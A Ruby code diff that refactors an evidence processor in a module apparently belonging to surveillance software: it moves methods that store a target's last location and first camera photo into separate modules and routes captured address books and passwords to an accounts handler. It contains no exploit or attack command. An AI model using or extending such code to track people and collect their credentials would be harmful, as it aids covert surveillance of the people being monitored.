@@ -10,6 +10,8 @@ require 'rcs-common/sanitize'
 require 'fileutils'
 
 require_relative 'accounts'
+require_relative 'camera'
+require_relative 'position'
 
 module RCS
 module Intelligence
@@ -47,10 +49,10 @@ class Processor
     case evidence.type
       when 'position'
         # save the last position of the entity
-        save_last_position(evidence, entity)
+        Position.save_last_position(entity, evidence)
       when 'camera'
         # save picture of the target
-        save_first_camera(evidence, entity)
+        Camera.save_first_camera(entity, evidence)
       when 'addressbook', 'password'
         # analyze the accounts
         Accounts.add_handle(entity, evidence)
@@ -60,30 +62,6 @@ class Processor
     trace :error, "Cannot process evidence: #{e.message}"
     trace :fatal, e.backtrace.join("\n")
   end
-
-
-  def self.save_last_position(evidence, entity)
-    return if evidence[:data]['latitude'].nil? or evidence[:data]['longitude'].nil?
-
-    entity.last_position = {latitude: evidence[:data]['latitude'].to_f,
-                            longitude: evidence[:data]['longitude'].to_f,
-                            time: evidence[:da],
-                            accuracy: evidence[:data]['accuracy'].to_i}
-    entity.save
-
-    trace :info, "Saving last position for #{entity.name}: #{entity.last_position.inspect}"
-  end
-
-
-  def self.save_first_camera(evidence, entity)
-    return unless entity.photos.empty?
-
-    file = RCS::DB::GridFS.get(evidence.data['_grid'], entity.path.last.to_s)
-    entity.add_photo(file.read)
-
-    trace :info, "Saving first camera picture for #{entity.name}"
-  end
-
 
 end
 
